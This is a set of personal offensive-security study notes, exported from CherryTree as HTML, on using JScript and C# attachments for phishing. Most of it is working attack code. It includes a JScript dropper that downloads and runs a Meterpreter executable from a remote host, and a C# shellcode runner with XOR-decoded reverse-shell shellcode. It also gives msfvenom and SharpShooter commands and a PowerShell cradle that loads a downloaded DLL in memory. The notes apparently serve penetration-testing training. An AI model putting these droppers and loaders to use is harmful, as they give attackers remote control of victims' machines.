<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>04 - jscript and c#</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>04 - jscript and c#</h1><br/><p><h2>Intro</h2><ul><li>• <small>• javascript attachement for phishing</small><ul><li><small>alternative to VBA </small></li><li><small>Jscript file format</small></li><li><small>interacts with the windows host script engine itself </small></li></ul></li><li></li></ul><div class="codebox"><pre>var shell <span style="color:#ff9d00;font-weight:700">=</span> new ActiveXObject(<span style="color:#3ad900;font-weight:400">&quot;WScript.Shell&quot;</span>)<br />var res <span style="color:#ff9d00;font-weight:700">=</span> shell.Run(<span style="color:#3ad900;font-weight:400">&quot;cmd.exe&quot;</span>);</pre></div></p><p></p><p></p><p><h2>revshell dropper basic</h2></p><p></p><p><div class="codebox"><pre>var url = &quot;http://192.168.119.120/met.exe&quot;<br />var Object = WScript.CreateObject(&#39;MSXML2.XMLHTTP&#39;);<br />Object.Open(&#39;GET&#39;, url, false);<br />Object.Send();<br />if (Object.Status == 200)<br />{<br />    var Stream = WScript.CreateObject(&#39;ADODB.Stream&#39;);<br />    Stream.Open();<br />    Stream.Type = 1;<br />    Stream.Write(Object.ResponseBody);<br />    Stream.Position = 0;<br /><br />    Stream.SaveToFile(&quot;met.exe&quot;, 2);<br />    Stream.Close();<br />    }<br />var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;met.exe&quot;);</pre></div></p><p></p><p><h2>Jscript and c#</h2><ul><li>goal: compile our code from memory<ul><li>we need <strong>win32 apis</strong> but jscript can&#39;t =&gt; powershell or c#</li><li>we’ll instead embed a compiled C# assembly in the Jscript file and execute it</li></ul></li><li>we&#39;ll use <strong>DotNetToJscript project </strong></li><li>Steps<ul><li>◇ <span style="color:#e01b24;">◇ compile c# to dll</span></li><li><span style="color:#e01b24;">copy \\$lhost\share\NDesk.Options.dll</span></li><li><span style="color:#e01b24;">.\DotNetToJScript.exe test.dll --lang=Jscript --ver=v4 -o demo.js</span></li></ul></li></ul></p><p></p><p></p><p>Shellcode runner dll (XOR)</p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Diagnostics;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br />[ComVisible(<span style="color:#ff0044;font-weight:400">true</span>)]<br /><span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> TestClass<br />{<br />    [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAlloc(IntPtr lpAddress, <span style="color:#7f0044;font-weight:400">uint</span> dwSize,<br />      <span style="color:#7f0044;font-weight:400">uint</span> flAllocationType, <span style="color:#7f0044;font-weight:400">uint</span> flProtect);<br /><br />    [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateThread(IntPtr lpThreadAttributes, <span style="color:#7f0044;font-weight:400">uint</span> dwStackSize,<br />      IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#7f0044;font-weight:400">uint</span> dwCreationFlags, IntPtr lpThreadId);<br /><br />    [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);<br />    <span style="color:#ff9d00;font-weight:700">public</span> TestClass()<br />    {<br /> <span style="color:#0088ff;font-weight:400">// sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.226 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a</span><br />        <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">600</span>] {<span style="color:#ff0044;font-weight:400">0xfc</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xf0</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,xxxx};<br /> <span style="color:#0088ff;font-weight:400">// XOR-decrypt the shellcode</span><br />            <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; buf.Length; i++)<br />            {<br />                buf[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)(buf[i] ^ (<span style="color:#7f0044;font-weight:400">byte</span>)<span style="color:#00117f;font-weight:400">&#39;a&#39;</span>);<br />            }<br /><br />        <span style="color:#7f0044;font-weight:400">int</span> size = buf.Length;<br /><br />        IntPtr addr = VirtualAlloc(IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x3000</span>, <span style="color:#ff0044;font-weight:400">0x40</span>);<br /><br />        Marshal.Copy(buf, <span style="color:#ff0044;font-weight:400">0</span>, addr, size);<br /><br />        IntPtr hThread = CreateThread(IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, addr, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, IntPtr.Zero);<br /><br />        WaitForSingleObject(hThread, <span style="color:#ff0044;font-weight:400">0xFFFFFFFF</span>);<br />    }<br />}</pre></div></p><p></p><p></p><p></p><p><h2>Sharpshooter</h2><ul><li>a payload creation framework for the retrieval and execution of arbitrary C# source code</li></ul></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.187 LPORT=443 -f raw -o /var/www/html/shell.txt<br /><span style="color:#ff9d00;font-weight:700">sudo</span> python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test</pre></div></p><p></p><p></p><p></p><p><h2>POwershell load dll in memory</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$data</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadData(<span style="color:#333333;font-weight:400">&#39;http://192.168.119.120/ClassLibrary1.dll&#39;</span>)<br /><br /><span style="color:#0088ff;font-weight:400">$assem</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Reflection.Assembly]<span style="color:#ff9d00;font-weight:700">::</span>Load(<span style="color:#0088ff;font-weight:400">$data</span>)<br /><span style="color:#0088ff;font-weight:400">$class</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$assem</span>.GetType(<span style="color:#3ad900;font-weight:400">&quot;ClassLibrary1.Class1&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$method</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$class</span>.GetMethod(<span style="color:#3ad900;font-weight:400">&quot;runner&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$method</span>.Invoke(<span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$null</span>)</pre></div></p></div>
</body>
</html>
